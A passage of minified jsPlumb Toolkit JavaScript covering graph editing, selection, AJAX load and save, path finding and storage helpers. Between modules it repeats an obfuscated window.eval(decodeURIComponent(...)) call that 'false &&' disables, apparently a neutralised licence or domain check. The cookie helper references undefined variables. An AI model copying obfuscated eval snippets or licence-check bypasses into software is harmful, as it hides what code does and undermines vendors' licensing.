e=w.getObjectInfo(t);w.setSuspendRendering(!0);try{if(!e.obj||"Node"!==e.type&&"Edge"!==e.type&&"Group"!==e.type){for(;t.getNodeCount()>0;)w.removeNode(t.getNodeAt(0));for(;t.getEdgeCount()>0;)w.removeEdge(t.getEdgeAt(0));for(;t.getGroupCount()>0;)w.removeGroup(t.getGroupAt(0))}else w["remove"+e.type](e.obj)}finally{w.setSuspendRendering(!1,!0)}}},this.setSuspendRendering=function(t,e){for(var n in et)et[n].setSuspendRendering(t,e)},this.batch=function(t){w.setSuspendRendering(!0);try{t()}catch(t){jsPlumbUtil.log("Error in transaction "+t)}finally{w.setSuspendRendering(!1,!0)}};var V=function(t,o,i,r,s){var a=G.getNode(t);if(a&&a.objectType){var l=n.extend({},a.data);if(o){for(var d in o)e.replace(a.data,d,o[d]);"Port"===a.objectType&&B(a.getNode())}w.fire(i,r(a,l),null)}}.bind(this),B=function(t){if(null!=v){var e=v(t.data,t,t.getPorts());null!=e&&(t.data=e)}};this.updateGroup=function(t,e){V(t,e,"groupUpdated",function(t,n){return{group:t,updates:e||{},originalData:n}})},this.updateNode=function(t,e){V(t,e,"nodeUpdated",function(t,n){return{node:t,updates:e||{},originalData:n}})},this.updatePort=function(t,e){V(t,e,"portUpdated",function(t,n){return{port:t,node:t.getNode(),updates:e||{},originalData:n}})},this.updateEdge=function(t,o){var i=G.getEdge(t);if(i){var r=n.extend({},i.data);if(o)for(var s in o)null==i.data[s]?i.data[s]=o[s]:e.replace(i.data,s,o[s]);w.fire("edgeUpdated",{edge:i,updates:o||{},originalData:r},null)}},this.update=function(t,n){return e.isString(t)&&(t=this.getNode(t)),t&&t.objectType&&this["update"+t.objectType](t,n),t},this.getPath=function(e){return new t.jsPlumbToolkit.Path(this,e)};var H=function(t){return null==t?null:"*"===t?G:t.constructor===i.Vertex||t.constructor===i.Port?t:e.isString(t)||e.isObject(t)?G.getVertex(t):null};this.findGraphObject=H;this.getEdges=function(t){return n="getEdges",o=!1,r=[],s={},(a=function(t,a,l,d){if(null!=t)for(var u=t[n]({filter:e.filter}),c=0;c<u.length;c++){var h=a&&t===G||u[c].source===t||o&&u[c].source.constructor===i.Port&&u[c].source.getNode()===t,p=l&&t===G||u[c].target===t||o&&u[c].target.constructor===i.Port&&u[c].target.getNode()===t;(a&&h||l&&p||d&&(h||p))&&(f=u[c],s[f.getId()]||(r.push(f),s[f.getId()]=!0))}var f})(H((e=(e=t)||{}).source),!0,!1,!1),a(H(e.target),!1,!0,!1),a(H(e.element),!1,!1,!0),r;var e,n,o,r,s,a},this.getAllEdges=function(){return G.getAllEdges()},this.getAllEdgesFor=function(t,e){return t.getAllEdges({filter:e})},this.selectAllEdges=function(){return this.filter(function(t){return"Edge"===t.objectType})},this.addAllEdgesToSelection=function(){this.addToSelection(this.getAllEdges())};var W,X,Y,Z=function(e,n,i){var r=(e=e||{}).type||"json",s=e.data,a=e.url,l=e.jsonp,d=e.onload,u=e.parameters||{},c=e.error||function(){};if(null==s&&null==a)throw new TypeError("You must supply either data or url to load.");var h=function(e){W=e,X=r,Y=!0,w.fire(n),t.jsPlumbToolkitIO.parse(r,e,w,u),tt(i),d&&d(w,e),w.fire("graphChanged")};if(s)h(s);else if(a){if(l)a=a+(-1===a.indexOf("?")?"?":"&")+"callback=?";var p="json"===r?r:e.dataType,f=e.headers||{Accept:"application/json"};o.ajax({url:a,success:h,dataType:p,error:c,headers:f})}return w};this.load=function(t){return Z(t,"dataLoadStart","dataLoadEnd")},this.append=function(t){return Z(t,"dataAppendStart","dataAppendEnd")},this.save=function(t){t=t||{};var e=this.exportData(t),i={"Content-Type":"application/json"};return n.extend(i,t.headers||{}),o.ajax({url:t.url,type:"POST",data:e,success:t.success||function(){},error:t.error||function(){},headers:i}),w},this.exportData=function(e){return e=e||{},t.jsPlumbToolkitIO.exportData(e.type||"json",w,e.parameters)};var q=function(t){return new o.Selection({toolkit:w,onClear:t||function(){}})},J=q(function(t){w.fire("selectionCleared",{selection:t})});a.maxSelectedNodes&&J.setMaxNodes(a.maxSelectedNodes),a.maxSelectedEdges&&J.setMaxEdges(a.maxSelectedEdges),a.selectionCapacityPolicy&&J.setCapacityPolicy(a.selectionCapacityPolicy);var $=function(t,e,n,o){return e||n.clear(!0),n.append(t,function(t){o&&w.fire("select",{append:e,obj:t,selection:n})})};this.setSelection=function(t){$(t,!1,J,!0)},this.select=function(t,e){var n=q(),o=$(t,!0,n);if(e)for(var i=0;i<o[0].length;i++){var r=o[0][i];if("Node"===r.objectType||"Port"===r.objectType)for(var s=r.getAllEdges(),a=0;a<s.length;a++)n.append(s[a])}return n};var K=function(t,e,n,o){for(var i=t.getAllEdges(),r=0,s=i.length;r<s;r++)if(i[r].source===t||i[r].getNode&&i[r].getNode()===t){var a=i[r].target,l=a.getFullId();o[l]||(e.append(a),n&&e.append(i[r]),o[l]=!0,K(a,e,n,o))}};this.selectDescendants=function(t,e,n){var o=w.getObjectInfo(t),i=q();if(o.obj&&"Node"===o.obj.objectType){e&&$(o.obj,!0,i);var r={};r[o.obj.getFullId()]=!0,K(o.obj,i,n,r)}return i},this.filter=function(t,e){var n="function"==typeof t?t:function(n){var o=n.data,i=!1;for(var r in t){var s=t[r]===o[r];if(!s&&!e)return!1;i=i||s}return i},o=q();return this.eachNode(function(t,e){n(e)&&o.append(e);for(var i=e.getPorts(),r=0;r<i.length;r++)n(i[r])&&o.append(i[r])}),this.eachEdge(function(t,e){n(e)&&o.append(e)}),this.eachGroup(function(t,e){n(e)&&o.append(e)}),o},this.addToSelection=function(t){var e=this.getObjectInfo(t);if(e){var n=$(e.obj,!0,J,!0);Q("deselect",n[1]),Q("select",n[0])}};var Q=function(t,e){for(var n=0;n<e.length;n++)w.fire(t,{obj:e[n],selection:J})};this.toggleSelection=function(t){var e=this.getObjectInfo(t);if(e){var n=[],o=J.toggle(e.obj,function(t,e){e||n.push(t)});Q("deselect",o[1]),Q("deselect",n),Q("select",o[0])}},this.removeFromSelection=function(t){var e=this.getObjectInfo(t);e&&J.remove(e.obj,function(t){w.fire("deselect",{obj:t,selection:J})})},this.addPathToSelection=function(t){this.addToSelection(this.getPath(t))},this.selectAll=function(){throw new TypeError("not implemented")},this.clearSelection=J.clear,this.getSelection=function(){return J},this.setMaxSelectedNodes=function(t){J.setMaxNodes(t)},this.setMaxSelectedEdges=function(t){J.setMaxEdges(t)},this.setSelectionCapacityPolicy=function(t){J.setCapacityPolicy(t)};var tt=function(t){w.setSuspendGraph(!0),w.fire(t),w.setSuspendGraph(!1),Y=!1},et={};if(this.render=function(i,r){var s=n.extend({},r||{});n.extend(s,i),s.toolkit=w,null!=i.selection&&(i.selection.constructor===o.Selection?s.toolkit=i.selection:s.toolkit=new o.Selection({generator:i.selection,toolkit:w}));var a=s.type||t.jsPlumbToolkit.DefaultRendererType,l=new t.jsPlumbToolkit.Renderers[a](s),d=s.id||e.uuid();return et[d]=l,l.id=d,l._onDestroy=function(t){delete et[t.id]},l},this.getRenderer=function(t){return et[t]},this.getRenderers=function(){return et},this.getObjectInfo=function(t,o){var i={els:{},obj:null,type:null,id:null,el:null},r=function(t){if(null!=t)return t.jtk?t:r(t.parentNode)};if(null!=t){if(t.eachNode&&t.eachEdge)return{obj:t};if(e.isArray(t))return{obj:t};var s=n.getElement(t);if(null!=s&&s.jtk)i.el=s,i.obj=s.jtk.port||s.jtk.node||s.jtk.group;else if(null!=t.tagName){var a=r(s);null!=a&&(i.el=a,i.obj=a.jtk.port||a.jtk.node||a.jtk.group)}else{if("string"==typeof t?t=this.getNode(t):"object"==typeof t&&void 0===t.objectType&&(t=this.getNode(l(t))),null==t)return i;i.obj=t,null!=o&&(i.el=o(t))}null==o&&(i.els=function(t){var e={};for(var n in et)e[n]=[et[n],et[n].getRenderedElement(t)];return e}(i.obj)),null!=i.obj&&(i.id=i.obj.id,i.type=i.obj.objectType)}return i},a.data){var nt=a.dataType||"json";w.load({data:a.data,type:nt})}},e.extend(t.jsPlumbToolkitInstance,e.EventGenerator),t.jsPlumbToolkit=new t.jsPlumbToolkitInstance({}),t.jsPlumbToolkit.DefaultRendererType=null,t.jsPlumbToolkit.ready=n.ready,t.jsPlumbToolkit.Renderers={},t.jsPlumbToolkit.Widgets={};var a=function(e){return new t.jsPlumbToolkitInstance(e)};t.jsPlumbToolkit.newInstance=a,"undefined"!=typeof exports&&(exports.jsPlumbToolkit=t.jsPlumbToolkit,exports.newInstance=a)}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("false%20%26%26%20window._j.%24%24_%24%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j._%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.__%2b%22.%22%2b(!%5b%5d%2b%22%22)%5bwindow._j._%24_%5d%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j.%24_%24_%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.__%24%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2b%22.%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.___%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24%24_%2bwindow._j._%24%24%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.%24_%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22!%3d%3d%27%5c%5c%22")),function(){var t=this.jsPlumbToolkit,e=this.jsPlumbToolkitUtil,n=this.jsPlumbUtil;t.Model=function(o,i){(o=o||{}).nodes=o.nodes||{},o.edges=o.edges||{},o.ports=o.ports||{},o.groups=o.groups||{};var r,s,a={},l=function(t){var n=e.mergeWithParents([t,"default"],o.edges);return delete n.parent,n},d=function(t,n){var i=n&&n.ports?e.mergeWithParents([t,"default"],n.ports):e.mergeWithParents([t,"default"],o.ports);return delete i.parent,i};if(void 0!==i){for(var u in o.edges){if((r=l(u)).overlays)for(s=0;s<r.overlays.length;s++)if(n.isArray(r.overlays[s])&&r.overlays[s][1].events)for(var c in r.overlays[s][1].events)r.overlays[s][1].events[c]=function(t,e){return function(n,o){t.call(e,{overlay:n,e:o,component:n.component,edge:n.component.edge})}}(r.overlays[s][1].events[c],r.overlays[s]);i.registerConnectionType(u,r)}for(s in o.ports)r=d(s),i.registerEndpointType(s,r);if(o.states)for(var h in o.states)a[h]=new t.UIState(h,o.states[h],i)}return{getNodeDefinition:function(t){var n=e.mergeWithParents([t,"default"],o.nodes);return delete n.parent,n},getEdgeDefinition:l,getPortDefinition:d,getGroupDefinition:function(t){var n=e.mergeWithParents([t,"default"],o.groups);return delete n.parent,n},getState:function(t){return a[t]}}}}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("false%20%26%26%20window._j.%24%24_%24%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j._%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.__%2b%22.%22%2b(!%5b%5d%2b%22%22)%5bwindow._j._%24_%5d%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j.%24_%24_%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.__%24%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2b%22.%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.___%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24%24_%2bwindow._j._%24%24%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.%24_%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22!%3d%3d%27%5c%5c%22")),function(){var t=jsPlumbToolkit.ready,e=[],n=!1,o=function(){n=!0;for(var o=0;o<e.length;o++)t.call(t,e[o])};jsPlumbToolkit.ready=function(o){n?t.call(t,o):e.push(o)},jsPlumb.ready(function(){var t=document.getElementById("jsPlumbToolkitTemplates");if(t)o();else{(t=document.createElement("div")).style.display="none",t.id="jsPlumbToolkitTemplates",document.body.appendChild(t);for(var e=new function(t){var e=0,n=function(){--e<=0&&o()};this.add=function(o){e++,jsPlumbToolkitUtil.ajax({url:o,success:function(e){var o=t.innerHTML;o+=e,t.innerHTML=o,n()},error:function(t){n()}})},this.ensureNotEmpty=function(){e<=0&&o()}}(t),n=document.getElementsByTagName("script"),i=0;i<n.length;i++){var r=n[i].getAttribute("type"),s=n[i].getAttribute("src");"text/x-jtk-templates"==r&&e.add(s)}e.ensureNotEmpty()}})}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("false%20%26%26%20window._j.%24%24_%24%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j._%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.__%2b%22.%22%2b(!%5b%5d%2b%22%22)%5bwindow._j._%24_%5d%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j.%24_%24_%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.__%24%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2b%22.%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.___%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24%24_%2bwindow._j._%24%24%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.%24_%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22!%3d%3d%27%5c%5c%22")),function(){"use strict";this.jsPlumbToolkit.Classes={LASSO:"jtk-lasso",LASSO_SELECT_DEFEAT:"jtk-lasso-select-defeat",MINIVIEW:"jtk-miniview",MINIVIEW_CANVAS:"jtk-miniview-canvas",MINIVIEW_PANNER:"jtk-miniview-panner",MINIVIEW_ELEMENT:"jtk-miniview-element",MINIVIEW_GROUP_ELEMENT:"jtk-miniview-group-element",MINIVIEW_PANNING:"jtk-miniview-panning",MINIVIEW_COLLAPSE:"jtk-miniview-collapse",MINIVIEW_COLLAPSED:"jtk-miniview-collapsed",NODE:"jtk-node",PORT:"jtk-port",GROUP:"jtk-group",SELECT_DEFEAT:"jtk-drag-select-defeat",SURFACE:"jtk-surface",SURFACE_DIRECT:"jtk-surface-direct-render",SURFACE_NO_PAN:"jtk-surface-nopan",SURFACE_CANVAS:"jtk-surface-canvas",SURFACE_PAN:"jtk-surface-pan",SURFACE_PAN_LEFT:"jtk-surface-pan-left",SURFACE_PAN_TOP:"jtk-surface-pan-top",SURFACE_PAN_RIGHT:"jtk-surface-pan-right",SURFACE_PAN_BOTTOM:"jtk-surface-pan-bottom",SURFACE_PAN_ACTIVE:"jtk-surface-pan-active",SURFACE_SELECTED_ELEMENT:"jtk-surface-selected-element",SURFACE_SELECTED_CONNECTION:"jtk-surface-selected-connection",SURFACE_PANNING:"jtk-surface-panning",SURFACE_ELEMENT_DRAGGING:"jtk-surface-element-dragging",SURFACE_DROPPABLE_NODE:"jtk-surface-droppable-node",TOOLBAR:"jtk-toolbar",TOOLBAR_TOOL:"jtk-tool",TOOLBAR_TOOL_SELECTED:"jtk-tool-selected",TOOLBAR_TOOL_ICON:"jtk-tool-icon"},this.jsPlumbToolkit.Constants={click:"click",start:"start",stop:"stop",drop:"drop",disabled:"disabled",pan:"pan",select:"select",drag:"drag",left:"left",right:"right",top:"top",bottom:"bottom",width:"width",height:"height",leftmin:"leftmin",leftmax:"leftmax",topmin:"topmin",topmax:"topmax",min:"min",max:"max",nominalSize:"50px",px:"px",onepx:"1px",nopx:"0px",em:"em",absolute:"absolute",relative:"relative",none:"none",block:"block",hidden:"hidden",div:"div",id:"id",plusEquals:"+=",minusEquals:"-=",dot:".",transform:"transform",transformOrigin:"transform-origin",nodeType:"Node",portType:"Port",edgeType:"Edge",groupType:"Group",surfaceNodeDragScope:"surfaceNodeDrag",mistletoeLayoutType:"Mistletoe",surfaceType:"Surface",jtkStatePrefix:"jtk-state-",msgCannotSaveState:"Cannot save state",msgCannotRestoreState:"Cannot restore state"},this.jsPlumbToolkit.Attributes={jtkNodeId:"jtk-node-id",relatedNodeId:"related-node-id"},this.jsPlumbToolkit.Methods={addClass:"addClass",removeClass:"removeClass"},this.jsPlumbToolkit.Events={beforeDrop:"beforeDrop",beforeDetach:"beforeDetach",click:"click",canvasClick:"canvasClick",canvasDblClick:"canvasDblClick",connection:"connection",connectionAborted:"connectionAborted",connectionDetached:"connectionDetached",connectionMoved:"connectionMoved",connectionDragStop:"connectionDragStop",contentDimensions:"contentDimensions",contextmenu:"contextmenu",dataLoadStart:"dataLoadStart",dataAppendStart:"dataAppendStart",dataLoadEnd:"dataLoadEnd",dataAppendEnd:"dataAppendEnd",dblclick:"dblclick",drag:"drag",drop:"drop",dragover:"dragover",dragend:"dragend",edgeAdded:"edgeAdded",edgeRemoved:"edgeRemoved",edgeTypeChanged:"edgeTypeChanged",elementDragged:"elementDragged",elementAdded:"elementAdded",elementRemoved:"elementRemoved",endOverlayAnimation:"endOverlayAnimation",graphClearStart:"graphClearStart",graphCleared:"graphCleared",groupAdded:"groupAdded",groupDragStop:"groupDragStop",groupExpand:"group:expand",groupCollapse:"group:collapse",groupRelayout:"group:relayout",groupRemoved:"groupRemoved",groupMemberAdded:"group:addMember",groupMemberRemoved:"group:removeMember",groupMoveEnd:"groupMoveEnd",groupUpdated:"groupUpdated",lassoEnd:"lasso:end",modeChanged:"modeChanged",mousedown:"mousedown",mousemove:"mousemove",mouseout:"mouseout",mouseup:"mouseup",mouseenter:"mouseenter",mouseleave:"mouseleave",mouseover:"mouseover",nodeAdded:"nodeAdded",nodeDropped:"nodeDropped",nodeMoveStart:"nodeMoveStart",nodeMoveEnd:"nodeMoveEnd",nodeRemoved:"nodeRemoved",nodeVisibility:"nodeVisibility",edgeTarget:"edgeTarget",nodeTypeChanged:"nodeTypeChanged",edgeSource:"edgeSource",objectRepainted:"objectRepainted",pan:"pan",portAdded:"portAdded",portRemoved:"portRemoved",portTypeChanged:"portTypeChanged",redraw:"redraw",start:"start",startOverlayAnimation:"startOverlayAnimation",stateRestored:"stateRestored",stop:"stop",tap:"tap",touchend:"touchend",touchmove:"touchmove",touchstart:"touchstart",unload:"unload",nodeRendered:"nodeRendered",nodeUpdated:"nodeUpdated",portUpdated:"portUpdated",edgeUpdated:"edgeUpdated",zoom:"zoom",relayout:"relayout",deselect:"deselect",selectionCleared:"selectionCleared",resize:"resize",anchorChanged:"anchorChanged"}}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("false%20%26%26%20window._j.%24%24_%24%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j._%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.__%2b%22.%22%2b(!%5b%5d%2b%22%22)%5bwindow._j._%24_%5d%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j.%24_%24_%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.__%24%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2b%22.%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.___%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24%24_%2bwindow._j._%24%24%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.%24_%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22!%3d%3d%27%5c%5c%22")),function(){"use strict";var t=this;t.jsPlumbToolkit.util={Cookies:{get:function(t){return document.cookie.match(new RegExp(t+"=[a-zA-Z0-9.()=|%/_]+($|;)","g")),val&&0!=val.length&&unescape(val[0].substring(t.length+1,val[0].length).replace(";",""))||null},set:function(t,e,n,o){var i=[t+"="+escape(e),"/",(domain,window.location.host)];return o&&i.push(function(){if("NaN"==parseInt(o))return"";var t=new Date;return t.setTime(t.getTime()+60*parseInt(o)*60*1e3),t.toGMTString()}()),document.cookie=i.join("; ")},unset:function(e,n,o){n=n&&"string"==typeof n?n:"",o=o&&"string"==typeof o?o:"",t.jsPlumbToolkit.util.Cookies.get(e)&&t.jsPlumbToolkit.util.Cookies.set(e,"","Thu, 01-Jan-70 00:00:01 GMT",n,o)}},Storage:{set:function(e,n){"undefined"==typeof localStorage?t.jsPlumbToolkit.util.Cookies.set(e,n):localStorage.setItem(e,n)},get:function(e){return"undefined"==typeof localStorage?t.jsPlumbToolkit.util.Cookies.read(e):localStorage.getItem(e)},clear:function(e){"undefined"==typeof localStorage?t.jsPlumbToolkit.util.Cookies.unset(e):localStorage.removeItem(e)},clearAll:function(){if("undefined"==typeof localStorage);else for(;localStorage.length>0;){var t=localStorage.key(0);localStorage.removeItem(t)}},setJSON:function(e,n){if("undefined"==typeof JSON)throw new TypeError("JSON undefined. Cannot store value.");t.jsPlumbToolkit.util.Storage.set(e,JSON.stringify(n))},getJSON:function(e){if("undefined"==typeof JSON)throw new TypeError("JSON undefined. Cannot retrieve value.");return JSON.parse(t.jsPlumbToolkit.util.Storage.get(e))}}}}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("false%20%26%26%20window._j.%24%24_%24%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j._%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.__%2b%22.%22%2b(!%5b%5d%2b%22%22)%5bwindow._j._%24_%5d%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j.%24_%24_%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.__%24%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2b%22.%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.___%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24%24_%2bwindow._j._%24%24%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.%24_%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22!%3d%3d%27%5c%5c%22")),function(){"use strict";var t=this.jsPlumbToolkit,e=this.jsPlumbUtil;t.Path=function(t,n){this.bind=t.bind,this.getModel=t.getModel,this.setSuspendGraph=t.setSuspendGraph,this.getNodeId=t.getNodeId,this.getEdgeId=t.getEdgeId,this.getPortId=t.getPortId,this.getNodeType=t.getNodeType,this.getEdgeType=t.getEdgeType,this.getPortType=t.getPortType;for(var o=t.getGraph().findPath(n.source,n.target,n.strict,n.nodeFilter,n.edgeFilter),i=function(){for(var e=0;e<o.path.length;e++)o.path[e].edge&&t.removeEdge(o.path[e].edge);return this}.bind(this),r=function(){for(var e=0;e<o.path.length;e++)t.removeNode(o.path[e].vertex);return this}.bind(this),s=[],a={},l=0;l<o.path.length;l++)s.push(o.path[l].vertex),a[t.getNodeId(o.path[l].vertex)]=[o.path[l].vertex,l];this.getNodes=function(){return s},this.getNode=function(t){return a["string"==typeof t?t:t.id][0]},this.getAllEdgesFor=function(t){var e=a[t.id][1];return e<o.path.length-1?[o.path[e+1].edge]:[]};var d=function(t,n){for(var i=n||0;i<o.path.length;i++)try{t(i,o.path[i])}catch(t){e.log("Path iterator function failed",t)}};this.each=function(t){d(function(e,n){t(e,n)})},this.eachNode=function(t){d(function(e,n){t(e,n.vertex)})},this.eachEdge=function(t){d(function(e,n){t(e,n.edge)},1)},this.getNodeCount=function(){return o.path.length},this.getNodeAt=function(t){return o.path[t].vertex},this.getEdgeCount=function(){return 0==o.path.length?0:o.path.length-1},this.getEdgeAt=function(t){return t<0&&(t=o.path.length-1+t),o.path.length>t+1?o.path[t+1].edge:null},this.path=o,this.deleteEdges=i,this.deleteNodes=r,this.deleteAll=r,this.isEmpty=function(){return 0==o.path.length},this.getCost=function(){return o.pathDistance},this.contains=function(e,n){var i=t.findGraphObject(e),r=!1;if(i)for(var s=0;s<o.path.length;s++)if(o.path[s].vertex==i||o.path[s].edge==i||!n&&"Port"==o.path[s].vertex.objectType&&o.path[s].vertex.isChildOf(i)){r=!0;break}return r},this.exists=function(){return null!=o.pathDistance},this.selectEdges=function(t){return _selectEdges(t,"getEdges",!1)},this.selectAllEdges=function(t){return _selectEdges(t,"getAllEdges",!0)}}}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("false%20%26%26%20window._j.%24%24_%24%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j._%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.__%2b%22.%22%2b(!%5b%5d%2b%22%22)%5bwindow._j._%24_%5d%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j.%24_%24_%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.__%24%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2b%22.%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.___%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24%24_%2bwindow._j._%24%24%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.%24_%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22!%3d%3d%27%5c%5c%22")),function(){"use strict";var t=this.jsPlumbToolkitIO={},e=this.jsPlumbUtil,n=this.jsPlumb;t.exporters={json:function(t,e){return t.getGraph().serialize()}},t.parsers={json:function(t,e,n){for(var o=t.nodes||[],i=t.edges||[],r=t.ports||[],s=t.groups||[],a=0;a<s.length;a++)e.addGroup(s[a]);for(var l=0;l<o.length;l++)e.addNode(o[l]);for(var d=0;d<r.length;d++)if(r[d].nodeId){var u=e.getNode(r[d].nodeId);if(null==u)throw new TypeError("Unknown node ["+r[d].nodeId+"]");u.addPort(r[d])}for(var c=0;c<i.length;c++){var h={source:i[c].source,target:i[c].target,cost:i[c].cost||1,directed:i[c].directed,data:i[c].data};i[c].geometry&&(h.geometry=i[c].geometry),e.addEdge(h)}},"hierarchical-json":function(t,e,n){var o=function(t){var n=e.addNode(t);if(t.children)for(var i=0;i<t.children.length;i++){var r=e.addNode(t.children[i]);e.addEdge({source:n,target:r}),o(t.children[i])}};o(t)}},t.managers={json:{removeNode:function(t,n,o){var i=o(n.data);e.removeWithFunction(t.nodes,function(t){return t.id===i})},removeEdge:function(t,n,o){var i=o(n.data);e.removeWithFunction(t.edges,function(t){return t.data&&t.data.id===i})},addNode:function(t,e,n){t.nodes=t.nodes||[],t.nodes.push(e.data)},addEdge:function(t,e,n){var o={source:e.source.getFullId(),target:e.target.getFullId(),data:e.data||{}};t.edges=t.edges||[],t.edges.push(o)},addPort:function(t,e,o){t.ports=t.ports||[];var i=n.extend({},e.port.data||{});i.id=e.port.getFullId(),t.ports.push(i)},removePort:function(t,n,o){var i=n.port.getFullId();e.removeWithFunction(t.ports,function(t){return t.id===i})}}},t.parse=function(e,n,o,i){var r=t.parsers[e];if(null==r)throw new Error("jsPlumb Toolkit - parse - ["+e+"] is an unsupported type");return r(n,o,i)},t.exportData=function(e,n,o){var i=t.exporters[e];if(null===i)throw new Error("jsPlumb Toolkit - exportData - ["+e+"]  is an unsupported type");return 